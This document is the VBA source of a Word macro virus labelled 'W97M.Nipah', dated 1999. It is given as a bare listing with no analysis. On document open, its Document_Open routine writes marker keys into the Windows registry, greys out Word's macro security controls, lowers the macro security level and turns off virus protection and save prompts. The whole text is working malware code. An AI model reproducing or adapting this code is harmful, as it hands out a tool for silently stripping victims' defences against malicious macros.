   Attribute VB_Name = "Nipah"
   '======================================================
   '  W97M.Nipah by Dr Virus Quest
   '  Origin from Malaysia
   '  Copyright©1999
   '======================================================
   Private Sub Document_Open()
   On Error Resume Next

   Set WshShell = CreateObject("WScript.Shell")

   WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Nipah\Infection", 0, "Nipah"
   WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Infection\Nipah", 0, "Nipah"
   WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Nipah", 0, "Nipah"
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Nipah\VirusName", "Nipah"
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Nipah\Creator", "Dr Virus Quest"
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Nipah\Created", "09051999"
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Nipah\Country", "Malaysia"

   If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
     CommandBars("Macro").Controls("Security...").Enabled = False
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
   Else
     CommandBars("Tools").Controls("Macro").Enabled = False
     Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
   End If
   End Sub
